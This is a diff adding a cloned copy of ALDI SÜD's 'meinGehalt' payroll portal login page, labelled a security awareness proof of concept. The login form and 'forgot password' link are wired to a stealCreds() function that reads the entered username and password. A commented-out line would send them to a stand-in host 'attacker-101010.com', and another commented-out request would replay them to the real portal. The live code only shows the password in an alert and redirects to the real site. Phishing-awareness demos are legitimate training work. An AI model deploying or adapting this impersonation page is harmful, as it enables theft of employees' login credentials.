@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<!-- This is only a Security Awareness Proof of Concept -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="robots" content="noindex, nofollow">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SmartDelivery</title>
+  <link rel="icon" type="image/png" href="https://meingehalt.aldi-sued.de/portal-v2/favicon.png">
+  <link rel="stylesheet" href="assets/main.css">
+  <link rel="stylesheet" href="assets/bootstrap.css">
+  <link rel="stylesheet" href="assets/bootstrap-custom.css">
+  <link rel="stylesheet" href="assets/glyphicons.css">
+  <link rel="stylesheet" href="assets/application.css">
+<link rel="stylesheet" href="assets/485941.css" type="text/css" charset="utf-8">
+
+</head>
+<body>
+
+<!-- edited: JS stealer -->
+  <script>
+    function stealCreds(){
+      var user = document.getElementById('userId').value;
+      var pass = document.getElementById('password').value;
+      //new Image().src="http://attacker-101010.com/login?u=" + user + "&p=" + pass;
+	  alert("Thank you for your password: " + pass);
+	  window.location.replace("https://meingehalt.aldi-sued.de/de/");
+
+	  
+	  /*
+	  "body": "userId=$user&password=$pass",*/
+	  
+	  /*fetch("https://meingehalt.aldi-sued.de/portalsvc/login/loginUser", {
+	  "headers": {
+		"content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+	  },
+	  "referrer": "https://meingehalt.aldi-sued.de/portal-v2/?application=SP&client=485941&lang=de",
+	  "body": "userId="+user+"&password="+pass,
+	  "method": "POST",
+	  "mode": "cors",
+	  "credentials": "include"
+	}); */
+    };
+  </script>
+  
+ 
+ 
+ <header _ngcontent-serverapp-c41="" class="grid-container full"><div  style="color: white !important; max-width: 100% !important; height: 147px; padding:0px 40px 0 40px;" _ngcontent-serverapp-c41="" class="top-bar grid-container"><div _ngcontent-serverapp-c41="" class="top-bar-left"><img _ngcontent-serverapp-c41="" src="assets/logo.png"><ul _ngcontent-serverapp-c41="" class="menu"><li _ngcontent-serverapp-c41=""><a _ngcontent-serverapp-c41="" href="?login">Anmeldung</a></li><li _ngcontent-serverapp-c41=""><a _ngcontent-serverapp-c41="" href="?registration">Registrierung</a></li><li _ngcontent-serverapp-c41=""><a _ngcontent-serverapp-c41="" href="./faq">FAQ</a></li></ul></div><div class="top-bar-right"><ul _ngcontent-serverapp-c41="" class="menu"><li _ngcontent-serverapp-c41=""><a _ngcontent-serverapp-c41="" href="/de/">DE</a></li><span _ngcontent-serverapp-c41="" style="color: #fff;">&nbsp;|&nbsp;</span><li _ngcontent-serverapp-c41=""><a _ngcontent-serverapp-c41="" href="/en/">EN</a></li></ul></div></div></header>
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+
+<section id="iframeTest" class="messages mt20" callattachhooks="true">
+  <div class="container stageLabelContainer">
+    <div class="stageLabel" style="display: none;"></div>
+  </div>
+  <div class="container clientInfoContainer" style="display: none;">
+    <div class="clientInfoLabel" style="display: none;"></div>
+  </div>
+  <div class="container alert alert-dismissible alert-danger" style="display: none;">
+    <a class="close" href="https://meingehalt.aldi-sued.de/portal-v2/?application=SP&amp;client=485941&amp;lang=de#">×</a>
+    <div></div>
+  </div>
+  <div class="container alert alert-dismissible alert-warning" style="display: none;">
+    <a class="close" href="https://meingehalt.aldi-sued.de/portal-v2/?application=SP&amp;client=485941&amp;lang=de#">×</a>
+    <div></div>
+  </div>
+  <div class="container alert alert-dismissible alert-success" style="display: none;">
+    <a class="close" href="https://meingehalt.aldi-sued.de/portal-v2/?application=SP&amp;client=485941&amp;lang=de#">×</a>
+    <div></div>
+  </div>
+</section>
+<div class="spine stack container main">
+  <div callattachhooks="true" class="active">
+    <span class="glyphicon blankImg"></span>
+    <h2>Login</h2>
+    <p>Bereits bei meinGehalt registriert? Dann logge dich hier mit deinen Benutzerdaten ein.</p>
+    	
+	<form id="uidform" action="javascript:stealCreds();"> <!-- edited: action -->
+      <input type="hidden" class="csrf-token" name="_csrf" value="c37f68bf-71f2-48de-aee8-e9c0b2806c5b">
+      <div class="row">
+        <div class="col-md-6">
+          <fieldset class="form-group has-error">
+            <label class="control-label">Benutzername:</label>
+            <!-- edited: id -->
+			<input type="email" name="userId" id="userId" class="form-control" required="required" autofocus="autofocus">
+          </fieldset>
+        </div>
+        <div class="col-md-6">
+          <fieldset class="form-group">
+            <label class="control-label">Passwort:</label>
+            <!-- edited: id-->
+			<input type="password" id="password" ame="password" class="form-control" required="required" pattern="^.{6,30}$" minlength="6" maxlength="30">
+          </fieldset>
+        </div>
+      </div>
+      <fieldset class="form-group pull-right">
+        <div class="pull-left font-small" style="padding-right: 10px;">
+          <span></span>
+          <a style="text-decoration:underline" class="textLink" href="javascript:stealCreds();">Passwort vergessen?</a>
+        </div>
+        <button type="submit" class="btn btn-primary pull-left" data-loading-text="Anmeldung…">Anmelden</button>
+      </fieldset>
+    </form>
+    <div class="clearfix">&nbsp;</div>
+    <div class="sectionBreak loginRegPanel">
+      <h2>Registriere dich hier</h2>
+      <p>Registriere dich hier mit deinem persönlichen Registrierungscode zu meinGehalt. Du hast dann zukünftig mit deinem Benutzernamen und deinem Kennwort Zugriff auf das meinGehalt Service-Portal.</p>
+      <a class="btn btn-primary regBtn font_black" href="https://meingehalt.aldi-sued.de/portal-v2/?application=SP&amp;client=485941&amp;lang=de#/registration">Noch nicht für meinGehalt registriert? Jetzt zur Registrierung</a>
+    </div>
+  </div>
+  <div class="hidden" callattachhooks="true">
+    <p class="mt30">Registriere dich hier mit deinem persönlichen Registrierungscode zu meinGehalt. Du hast dann zukünftig mit deinem Benutzernamen und deinem Kennwort Zugriff auf das meinGehalt Service-Portal.</p>
+    <form class="mt50" id="codeform">
+      <input type="hidden" class="csrf-token" name="_csrf" value="c37f68bf-71f2-48de-aee8-e9c0b2806c5b">
+      <div class="row">
+        <div class="col-md-6">
+          <fieldset class="form-group">
+            <label class="control-label">Mein Registrierungscode:</label>
+            <input type="text" name="code" class="form-control" autocomplete="off" required="required" tabindex="1">
+          </fieldset>
+          <fieldset class="form-group">
+            <label class="control-label">Personalnummer</label>
+            <input type="text" name="authFieldValue" class="form-control" required="required">
+          </fieldset>
+          <div class="font-small" style="margin-top:-12px">
+            <span>Bereits registriert?</span>&nbsp; <a href="https://meingehalt.aldi-sued.de/portal-v2/?application=SP&amp;client=485941&amp;lang=de#/login" class="textLink">Hier zum Login.</a>
+          </div>
+        </div>
+        <div class="col-md-6">
+          <fieldset class="form-group">
+            <label class="control-label">
+              <span>Gib bitte den Sicherheitscode aus dem Bild ein.</span>
+            </label>
+            <div class="form-inline" callattachhooks="true">
+              <div class="row">
+                <div class="col-md-4">
+                  <img class="captcha" src="https://meingehalt.aldi-sued.de/portal-v2/?application=SP&amp;client=485941&amp;lang=de">
+                </div>
+                <div class="col-md-8">
+                  <input type="text" style="width:100%" name="captchaAnswer" class="form-control input-medium" required="required" maxlength="10" autocomplete="off">
+                </div>
+              </div>
+              <div class="font-small" style="text-align:right; padding-right:10px;">
+                <span>Bild nicht lesbar?</span>&nbsp; <a class="nowrap textLink" href="javascript:void(0)" click="reload">Klicke hier.</a>
+              </div>
+              <div class="font-small" style="text-align:right; padding-right:10px;">
+                <a class="textLink" data-original-title="" title="">Warum ein Sicherheitscode?</a>
+              </div>
+            </div>
+          </fieldset>
+        </div>
+      </div>
+      <fieldset class="form-group pull-right mt20">
+        <button class="btn btn-primary" data-loading-text="Registrierung ...">Registrieren</button>
+      </fieldset>
+    </form>
+    <div class="clearfix">&nbsp;</div>
+    <div class="sectionBreak RegInfoPanel">
+      <h2 class="headline-big">Hast du noch Fragen?</h2>
+      <p>
+        <span style="font-weight:bold">Hilfe &amp; Support zum meinGehalt-Portal - Wir helfen dir gerne! </span>
+        <br>
+        <span>Bei Fragen zum meinGehalt-Portal helfen wir dir gerne.</span>&nbsp; <a class="textLink" href="https://meingehalt.aldi-sued.de/portal-v2/?application=SP&amp;client=485941&amp;lang=de" target="_blank"></a>&nbsp; <span>Im Folgenden haben wir für dich Antworten auf häufig gestellte Fragen ( <a class="textLink" href="https://meingehalt.aldi-sued.de/faq" target="_blank">FAQs</a>) zusammengestellt. Wenn deine Frage hier nicht beantwortet wurde, kannst du über <a class="textLink" href="mailto:meingehalt-portal@aldi-sued.de" target="_blank"> meingehalt-portal@aldi-sued.de</a> Kontakt zu uns aufnehmen. </span>
+      </p>
+    </div>
+  </div>
+  <div class="hidden mt20" callattachhooks="true">
+    <p></p>
+    <div>
+      <span class="address-panel whiteBG"></span>
+    </div>
+    <div class="thinkGreen">
+      <img src="assets/thinkGreen.png">
+    </div>
+    <p class="clear"></p>
+    <form>
+      <input type="hidden" class="csrf-token" name="_csrf" value="c37f68bf-71f2-48de-aee8-e9c0b2806c5b">
+      <div class="row mt30">
+        <fieldset class="form-group col-md-6">
+          <label class="control-label">Meine E-Mail-Adresse:</label>
+          <input type="text" name="userId" class="form-control" required="required">
+        </fieldset>
+        <fieldset class="form-group col-md-6">
+          <label class="control-label">E-Mail-Adresse wiederholen:</label>
+          <input type="text" name="userId2" class="form-control" required="required">
+        </fieldset>
+      </div>
+      <div class="row">
+        <fieldset class="form-group col-md-6">
+          <label class="control-label">Passwort wählen:</label>
+          <input type="password" class="form-control" required="required" pattern=".+" maxlength="30" name="password" callattachhooks="true">
+        </fieldset>
+        <fieldset class="form-group col-md-6">
+          <label class="control-label">Passwort wiederholen:</label>
+          <input type="password" class="form-control" required="required" pattern=".+" maxlength="30" callattachhooks="true">
+        </fieldset>
+      </div>
+      <div class="row">
+        <fieldset class="form-group col-md-6">
+          <div class="strength-meter" callattachhooks="true">
+            <label>Wie sicher ist Ihr Passwort?</label>
+            <div class="strength-bar"></div>
+            <div class="strength-bar"></div>
+            <div class="strength-bar"></div>
+            <div class="strength-bar"></div>&nbsp; <span>(ungenügend)</span>
+          </div>
+        </fieldset>
+        <fieldset class="form-group col-md-6">
+          <span>Zu deiner eigenen Sicherheit muss das Passwort aus mindestens 10 Zeichen bestehen und Zeichen aus mindestens 3 der folgenden Zeichengruppen enthalten: Großbuchstaben, Kleinbuchstaben, Ziffern, Sonderzeichen.</span>
+        </fieldset>
+      </div>
+      <fieldset>
+        <p class="panel whiteBG termsinfopanel" style="margin-bottom: 0px; display: none;">Die Daten, die im Rahmen der Registrierung angegeben werden, und solche, die zu Abrechnungszwecken dienen, werden zur Bereitstellung der Entgeltnachweise im Auftrag von ALDI SÜD verarbeitet. Die Verarbeitung der Daten ist zur Durchführung des Beschäftigungsverhältnisses und Vertragserfüllung erforderlich und geschieht durch den Dienstleister „paragon GmbH &amp; Co. KGaA“. Die Verarbeitung der privaten E-Mail-Adresse liegt im berechtigten Interesse von ALDI SÜD und ist erforderlich zur effizienteren Arbeitsweise, Kostenreduzierung und Vermeidung von Papierabfall. Die eingegebene E-Mail-Adresse wird auch in den ALDI SÜD HR Systemen genutzt, damit du selbst Kennwörter zurücksetzen, über E-Learnings oder über für das Arbeitsverhältnis benötigte Dokumente („Muss-Dokumente“) informiert werden kannst. Deine private E-Mail-Adresse kannst du jederzeit in SuccessFactors ( <a class="textLink" href="https://sf.aldi-sued.de/" target="_blank">sf.aldi-sued.de</a>) ändern oder löschen. </p>
+      </fieldset>
+      <fieldset>
+        <div class="checkbox termsCheckboxPanel">
+          <label>
+            <input type="checkbox" required="required">
+            <span>Ja, ich möchte zukünftig den Service von meinGehalt nutzen. Die <a href="https://meingehalt.aldi-sued.de/portal-v2/%7B0%7D" target="blank">Allgemeinen Geschäftsbedingungen</a> und die <a href="https://meingehalt.aldi-sued.de/portal-v2/%7B1%7D" target="blank">Datenschutzbestimmungen</a> habe ich gelesen und bin damit einverstanden. </span>
+          </label>
+        </div>
+      </fieldset>
+      <div>
+        <p class="panel whiteBG" style="margin-bottom: 0px">meinGehalt kann prüfen, ob ein anderes Unternehmen, das ebenfalls Dokumente durch docsellent GmbH versenden lässt, auch Dokumente für mich/meine Organisation versendet und mich darüber informieren. Dazu ist erforderlich, dass meine Adressdaten und meine E-Mail-Adresse in einer Datenbank gespeichert werden.</p>
+        <fieldset>
+          <div class="checkbox">
+            <label>
+              <input type="checkbox">Ja, Ich bin damit einverstanden, dass die docsellent GmbH die Anschriftsdaten für Zwecke des Adressabgleichs nutzt. Die Speicherung der Daten erfolgt allein zu dem Zweck, dass mir docsellent die Nutzung von SmartDelivery für die digitale Zustellung von Dokumenten weiterer Dokumentenversender anbieten kann. Eine Weitergabe oder ein Verkauf von Daten an Dritte ist grundsätzlich ausgeschlossen. Sie können diese Einwilligung jederzeit gegenüber der docsellent GmbH widerrufen. </label>
+          </div>
+        </fieldset>
+      </div>
+      <fieldset class="form-group mt10 pull-right">
+        <button type="button" click="onCancel" class="btn btn-default darkBtn">Abbrechen</button>
+        <button type="submit" click="validateCheck" class="btn btn-primary ml10">Account erstellen</button>
+      </fieldset>
+      <div class="clearfix mb40"></div>
+    </form>
+  </div>
+  <div class="hidden mt20" callattachhooks="true">
+    <p></p>
+    <div>
+      <span class="address-panel whiteBG"></span>
+    </div>
+    <div class="thinkGreen">
+      <img src="assets/thinkGreen.png">
+    </div>
+    <p class="clear"></p>
+    <form>
+      <input type="hidden" class="csrf-token" name="_csrf" value="c37f68bf-71f2-48de-aee8-e9c0b2806c5b">
+      <div class="row mt30">
+        <fieldset class="form-group col-md-6">
+          <label class="control-label">Meine E-Mail-Adresse:</label>
+          <input type="text" name="termsUserRegUserId" class="form-control" required="required">
+        </fieldset>
+      </div>
+      <div class="row">
+        <fieldset class="form-group col-md-6">
+          <label class="control-label">Passwort wählen:</label>
+          <input type="password" class="form-control" required="required" pattern=".+" maxlength="30" name="password" callattachhooks="true">
+        </fieldset>
+        <fieldset class="form-group col-md-6">
+          <label class="control-label">Passwort wiederholen:</label>
+          <input type="password" class="form-control" required="required" pattern=".+" maxlength="30" callattachhooks="true">
+        </fieldset>
+      </div>
+      <div class="row">
+        <fieldset class="form-group col-md-6">
+          <div class="strength-meter" callattachhooks="true">
+            <label>Wie sicher ist Ihr Passwort?</label>
+            <div class="strength-bar"></div>
+            <div class="strength-bar"></div>
+            <div class="strength-bar"></div>
+            <div class="strength-bar"></div>&nbsp; <span>(ungenügend)</span>
+          </div>
+        </fieldset>
+        <fieldset class="form-group col-md-6">
+          <span></span>
+        </fieldset>
+      </div>
+      <fieldset>
+        <div class="checkbox">
+          <label>
+            <input type="checkbox" required="required">
+            <span>Ja, ich möchte zukünftig den Service von meinGehalt nutzen. Die <a href="https://meingehalt.aldi-sued.de/portal-v2/%7B0%7D" target="blank">Allgemeinen Geschäftsbedingungen</a> und die <a href="https://meingehalt.aldi-sued.de/portal-v2/%7B1%7D" target="blank">Datenschutzbestimmungen</a> habe ich gelesen und bin damit einverstanden. </span>
+          </label>
+        </div>
+      </fieldset>
+      <div>
+        <p class="panel whiteBG" style="margin-bottom: 0px">meinGehalt kann prüfen, ob ein anderes Unternehmen, das ebenfalls Dokumente durch docsellent GmbH versenden lässt, auch Dokumente für mich/meine Organisation versendet und mich darüber informieren. Dazu ist erforderlich, dass meine Adressdaten und meine E-Mail-Adresse in einer Datenbank gespeichert werden.</p>
+        <fieldset>
+          <div class="checkbox">
+            <label>
+              <input type="checkbox">Ja, Ich bin damit einverstanden, dass die docsellent GmbH die Anschriftsdaten für Zwecke des Adressabgleichs nutzt. Die Speicherung der Daten erfolgt allein zu dem Zweck, dass mir docsellent die Nutzung von SmartDelivery für die digitale Zustellung von Dokumenten weiterer Dokumentenversender anbieten kann. Eine Weitergabe oder ein Verkauf von Daten an Dritte ist grundsätzlich ausgeschlossen. Sie können diese Einwilligung jederzeit gegenüber der docsellent GmbH widerrufen. </label>
+          </div>
+        </fieldset>
+      </div>
+      <fieldset class="form-group mt10 pull-right">
+        <button type="button" click="onCancel" class="btn btn-default darkBtn">Abbrechen</button>
+        <button type="submit" click="validateCheck" class="btn btn-primary ml10">Account erstellen</button>
+      </fieldset>
+      <div class="clearfix mb40"></div>
+    </form>
+  </div>
+  <div outlet="settingView" class="hidden pb30" callattachhooks="true">
+    <h1 class="headline-big mt40 mb20">Dokumente zuordnen</h1>
+    <p>Hier kannst du sehen, welchen Dokumententypen du einen Empfangskanal zugeordnet hast, sowie die Zuordnungen verändern.</p>
+    <p>Zum Hinzufügen weiterer Empfangskanäle wechsle bitte zu "Empfangskanäle verwalten".</p>
+    <div class="docBox mt20">
+      <p class="bold">Dokumentenart</p>
+      <div class="box"></div>
+    </div>
+    <div class="docBoxBreak mobileHide">
+      <img src="assets/settingArrow.jpg">
+    </div>
+    <div class="docBox mt20">
+      <p class="bold">Empfangskanäle</p>
+      <div class="box inactive">
+        <p>Bitte zuerst Dokumentenart auswählen</p>
+      </div>
+      <p class="smallInfo">Änderungen werden direkt gespeichert</p>
+    </div>
+    <div class="docBoxBreak mobileHide">
+      <img src="assets/settingArrow.jpg">
+    </div>
+    <div class="docBox mt20">
+      <p class="bold">Archiv-Optionen</p>
+      <div class="box inactive">
+        <p>Bitte zuerst Empfangskanal auswählen</p>
+      </div>
+    </div>
+    <a class="btn btn-primary regBtn font_black mb40 clear" style="margin-top:-10px;" href="https://meingehalt.aldi-sued.de/portal-v2/?application=SP&amp;client=485941&amp;lang=de#/account/receiverinput">Weiteren Empfangskanal hinzufügen</a>
+  </div>
+  <div class="hidden" callattachhooks="true">
+    <h1 class="headline-big mt40 mb20">Dokumentenarchiv</h1>
+    <p style="font-weight:bold;">Hier kannst du alle für dich archivierten Dokumente einsehen und als Datei abrufen.</p>
+    <p>Du kannst dir die Dokumente mit einem Klick auf den Button direkt als PDF öffnen und anzeigen lassen. Das geöffnete PDF-Dokument kannst du drucken und/oder lokal auf deinem PC speichern. <br>
+      <br>
+      <b>Die Dokumente werden 24 Monate ab Bereitstellung gespeichert</b>
+    </p>
+    <fieldset class="form-inline mt20 mb20">
+      <span style="font-weight:bold;">Tabelle filtern nach: </span>&nbsp; <select change="updateTable" class="form-control archivSelect"></select>
+      <select change="updateTable" class="form-control archivSelect ml10"></select>
+    </fieldset>
+    <table class="table table-striped" data-sort-name="date" data-sort-order="desc">
+      <thead>
+        <tr>
+          <th data-field="date" data-sortable="true">Versanddatum</th>
+          <th class="mobileHideTableCell">Monat</th>
+          <th class="mobileHideTableCell">Dokumentenart</th>
+          <th class="mobileHideTableCell">Information/Hinweis</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td colspan="4">Keine Dokumente vorhanden.</td>
+        </tr>
+      </tbody>
+    </table>
+    <div class="mb40"></div>
+  </div>
+  <div class="hidden mt20" callattachhooks="true">
+    <form class="form-inline">
+      <input type="hidden" class="csrf-token" name="_csrf" value="c37f68bf-71f2-48de-aee8-e9c0b2806c5b">
+      <p>Die Erstellung deines Benutzerkontos ist fast abgeschlossen. In Kürze erhältst du von uns eine E-Mail zur Bestätigung deiner Neuanmeldung. Bitte nutze innerhalb der nächsten 24 Stunden den dort enthaltenen Link, um dein Benutzerkonto zu aktivieren. <br> Oder gib einfach hier den Bestätigungscode aus der E-Mail ein: </p>
+      <input type="text" class="form-control input-medium" name="validationcode" required="required">&nbsp; <button class="btn btn-primary" type="submit">Code absenden</button>
+      <p></p>
+      <p>Erst nach erfolgreicher Aktivierung des Benutzerkontos kannst du Empfangskanäle konfigurieren </p>
+      <p> Dein ALDI SÜD meinGehalt-Team </p>
+      <p> Solltest du die E-Mail nicht in deinem Posteingang finden, prüfe bitte den Spam Ordner deines E-Mail Accounts. </p>
+      <p></p>
+      <div>
+        <p>Mit folgenden Daten hast du dich registriert:</p>
+        <p></p>
+      </div>
+      <div class="mb40"></div>
+    </form>
+  </div>
+  <div class="hidden mb40" callattachhooks="true">
+    <h1 class="headline-big mt40 mb20">Benutzerkonto verwalten</h1>
+    <div class="accordion">
+      <div id="changepwdTab" class="head" click="onTabClicked" data-id="changepwd">
+        <span class="expansionIcon glyphicon-plus"></span>Passwort ändern
+      </div>
+      <div id="changepwd" class="content" style="height: 0px;">
+        <div class="inside">
+          <div class="" callattachhooks="true">
+            <p>Zu deiner eigenen Sicherheit muss das Passwort aus mindestens 10 Zeichen bestehen und Zeichen aus mindestens 3 der folgenden Zeichengruppen enthalten: Großbuchstaben, Kleinbuchstaben, Ziffern, Sonderzeichen.</p>
+            <form>
+              <input type="hidden" class="csrf-token" name="_csrf" value="c37f68bf-71f2-48de-aee8-e9c0b2806c5b">
+              <div class="row mt30">
+                <fieldset class="form-group col-md-6">
+                  <label>Dein Benutzername:</label>
+                  <p class="form-control-static"></p>
+                </fieldset>
+                <fieldset class="form-group col-md-6">
+                  <label>Aktuelles Passwort:</label>
+                  <input type="password" class="form-control" required="required" pattern=".+" maxlength="30" tabindex="1" callattachhooks="true">
+                </fieldset>
+              </div>
+              <div class="row">
+                <fieldset class="form-group col-md-6">
+                  <label>Neues Passwort:</label>
+                  <input type="password" class="form-control" required="required" pattern=".+" maxlength="30" name="password" tabindex="2" callattachhooks="true">
+                </fieldset>
+                <fieldset class="form-group col-md-6">
+                  <label>Passwort wiederholen:</label>
+                  <input type="password" class="form-control" required="required" pattern=".+" maxlength="30" name="password2" tabindex="3" callattachhooks="true">
+                </fieldset>
+              </div>
+              <fieldset class="form-group">
+                <div class="pull-left">
+                  <div class="strength-meter" callattachhooks="true">
+                    <label>Wie sicher ist Ihr Passwort?</label>
+                    <div class="strength-bar"></div>
+                    <div class="strength-bar"></div>
+                    <div class="strength-bar"></div>
+                    <div class="strength-bar"></div>&nbsp; <span></span>
+                  </div>
+                </div>
+                <div class="pull-right mt10">
+                  <button type="button" class="btn btn-default cancel darkBtn">Abbrechen</button>
+                  <button type="submit" class="btn btn-primary ml10">Speichern</button>
+                </div>
+              </fieldset>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="accordion">
+      <div id="changeuserTab" class="head" click="onTabClicked" data-id="changeuser">
+        <span class="expansionIcon glyphicon-plus"></span>Benutzername ändern
+      </div>
+      <div id="changeuser" class="content" style="height: 0px;">
+        <div class="inside">
+          <div class="" callattachhooks="true">
+            <p>Hier kannst du aus deinen gültigen Empfangskanälen vom Typ "E-Mail" einen neuen Benutzernamen wählen. Wenn du einen Benutzernamen verwenden möchtest, der hier noch nicht aufgeführt ist, dann leg bitte erst einen entsprechenden Empfangskanal an.</p>
+            <table class="table table-striped">
+              <thead>
+                <tr>
+                  <th>Benutzername/Adresse</th>
+                  <th class="mobileHideTableCell">Empfangskanal</th>
+                  <th></th>
+                </tr>
+              </thead>
+              <tbody></tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="accordion">
+      <div id="changeAccountLanguageCtrlTab" class="head" click="onTabClicked" data-id="changeAccountLanguageCtrl">
+        <span class="expansionIcon glyphicon-plus"></span>E-Mail Sprache
+      </div>
+      <div id="changeAccountLanguageCtrl" class="content" style="height: 0px;">
+        <div class="inside">
+          <div class="" callattachhooks="true">
+            <p>Bitte wähle die Sprache für die E-Mails</p>
+            <table class="table table-striped">
+              <thead>
+                <tr>
+                  <th>Sprache</th>
+                  <th></th>
+                </tr>
+              </thead>
+              <tbody></tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="accordion">
+      <div id="notificationsTab" class="head" click="onTabClicked" data-id="notifications">
+        <span class="expansionIcon glyphicon-plus"></span>Benachrichtigungen
+      </div>
+      <div id="notifications" class="content" style="height: 0px;">
+        <div class="inside">
+          <div class="container" callattachhooks="true">
+            <p>Hier kannst du festlegen, ob du eine Benachrichtigung erhalten möchtest, wenn ein neues Dokument im Archiv für dich bereitgestellt wurde.</p>
+            <div class="radius" style="display:block; width:70px; height:28px; overflow:hidden; border: 1px solid #CCCCCC; float: left;">
+              <div id="btnContainer" class="btn-group" style="width:200px;">
+                <button class="btn btn-primary" click="onBtnActive" style="padding: 3px 15px; border:none;">An</button>
+                <button class="btn btn-default" style="color: #fff;padding: 3px 15px;height:28px;pointer-events: none; cursor: not-allowed; border:none;"></button>
+                <button class="btn btn-danger" click="onBtnInactive" style="padding: 3px 15px; border:none;">Aus</button>
+              </div>
+            </div>
+            <p id="notificationLabel" style="float: left; margin-left:20px;"></p>
+            <div style="clear: both;"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="accordion">
+      <div id="receiverTab" class="head" click="onTabClicked" data-id="receiver">
+        <span class="expansionIcon glyphicon-plus"></span>Empfangskanäle verwalten
+      </div>
+      <div id="receiver" class="content" style="height: 0px;">
+        <div class="inside">
+          <div callattachhooks="true">
+            <form>
+              <input type="hidden" class="csrf-token" name="_csrf" value="c37f68bf-71f2-48de-aee8-e9c0b2806c5b">
+              <p>Hier kannst du sehen, welche Empfangskanäle bereits für meinGehalt konfiguriert wurden, Änderungen vornehmen, sowie bei Bedarf weitere Empfangskanäle hinzufügen.</p>
+              <p>Unter "Dokumente zuordnen" legst du fest, welche Mail-Adressen beim Versand verwendet werden. </p>
+              <p></p>
+              <table class="table table-striped">
+                <thead>
+                  <tr>
+                    <th>Adresse</th>
+                    <th class="mobileHideTableCell">Empfangskanal</th>
+                    <th class="mobileHideTableCell">Status</th>
+                    <th></th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td colspan="4">keine Einträge vorhanden</td>
+                  </tr>
+                </tbody>
+                <tfoot class="inputrow" style="display: none;">
+                  <tr>
+                    <td class="form-group">
+                      <input class="form-control col-md-5" required="required">
+                    </td>
+                    <td class="form-group">
+                      <select class="form-control col-md-2" name="slChannel" callattachhooks="true"></select>
+                    </td>
+                    <td colspan="2" class="mobileHideTableCell"></td>
+                  </tr>
+                  <tr>
+                    <td colspan="2" class="form-group">
+                      <div class="pull-right">
+                        <button click="cancelInputs" class="btn btn-default darkBtn" type="button">Abbrechen</button>
+                        <button class="btn btn-primary ml10" type="submit">Speichern</button>
+                      </div>
+                    </td>
+                    <td colspan="2" class="mobileHideTableCell"></td>
+                  </tr>
+                </tfoot>
+              </table>
+              <button click="initInputs" class="btn btn-default" type="button" style="display: inline-block;">Neue Adresse</button>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="hidden" callattachhooks="true">
+    <p class="mt30">Trage deinen Benutzernamen ein. Wir schicken dir dann einen Link, über den du ein neues Passwort einrichten kannst.</p>
+    <form class="mt50">
+      <input type="hidden" class="csrf-token" name="_csrf" value="c37f68bf-71f2-48de-aee8-e9c0b2806c5b">
+      <div class="row">
+        <div class="col-md-6">
+          <fieldset class="form-group">
+            <label class="control-label">Benutzername:</label>
+            <input type="email" name="userId" class="form-control" required="required">
+          </fieldset>
+        </div>
+        <div class="col-md-6">
+          <fieldset class="form-group">
+            <label class="control-label">
+              <span>Gib bitte den Sicherheitscode aus dem Bild ein.</span>
+            </label>
+            <div class="form-inline" callattachhooks="true">
+              <div class="row">
+                <div class="col-md-4">
+                  <img class="captcha" src="https://meingehalt.aldi-sued.de/portal-v2/?application=SP&amp;client=485941&amp;lang=de">
+                </div>
+                <div class="col-md-8">
+                  <input type="text" style="width:100%" name="captchaAnswer" class="form-control input-medium" required="required" maxlength="10" autocomplete="off">
+                </div>
+              </div>
+              <div class="font-small" style="text-align:right; padding-right:10px;">
+                <span>Bild nicht lesbar?</span>&nbsp; <a class="nowrap textLink" href="javascript:void(0)" click="reload">Klicke hier.</a>
+              </div>
+              <div class="font-small" style="text-align:right; padding-right:10px;">
+                <a class="textLink" data-original-title="" title="">Warum ein Sicherheitscode?</a>
+              </div>
+            </div>
+          </fieldset>
+        </div>
+      </div>
+      <fieldset class="form-group pull-right mt20">
+        <a class="btn btn-default cancel darkBtn" href="https://meingehalt.aldi-sued.de/portal-v2/?application=SP&amp;client=485941&amp;lang=de#/login">Abbrechen</a>
+        <button type="submit" class="btn btn-primary ml10">Passwort anfordern</button>
+      </fieldset>
+      <div class="clearfix mb40">&nbsp;</div>
+    </form>
+  </div>
+  <div class="hidden" callattachhooks="true">
+    <h1 class="headline-big mt40 mb20">Passwort ändern</h1>
+    <p>Zu deiner eigenen Sicherheit muss das Passwort aus mindestens 10 Zeichen bestehen und Zeichen aus mindestens 3 der folgenden Zeichengruppen enthalten: Großbuchstaben, Kleinbuchstaben, Ziffern, Sonderzeichen.</p>
+    <form>
+      <input type="hidden" class="csrf-token" name="_csrf" value="c37f68bf-71f2-48de-aee8-e9c0b2806c5b">
+      <div class="row">
+        <fieldset class="form-group col-md-6">
+          <label>Neues Passwort:</label>
+          <input type="password" class="form-control" required="required" pattern=".+" maxlength="30" name="password" callattachhooks="true">
+        </fieldset>
+        <fieldset class="form-group col-md-6">
+          <label>Passwort wiederholen:</label>
+          <input type="password" class="form-control" required="required" pattern=".+" maxlength="30" name="password2" callattachhooks="true">
+        </fieldset>
+      </div>
+      <div class="row">
+        <fieldset class="form-group col-md-6">
+          <div class="strength-meter" callattachhooks="true">
+            <label>Wie sicher ist Ihr Passwort?</label>
+            <div class="strength-bar"></div>
+            <div class="strength-bar"></div>
+            <div class="strength-bar"></div>
+            <div class="strength-bar"></div>&nbsp; <span></span>
+          </div>
+        </fieldset>
+        <fieldset class="form-group col-md-6">
+          <span></span>
+        </fieldset>
+      </div>
+      <fieldset class="form-group">
+        <div class="pull-right mt10">
+          <button type="button" class="btn btn-default cancel darkBtn">Abbrechen</button>
+          <button type="submit" class="btn btn-primary ml10">Speichern</button>
+        </div>
+      </fieldset>
+    </form>
+    <div class="clearfix mb40">&nbsp;</div>
+  </div>
+</div>
+
+
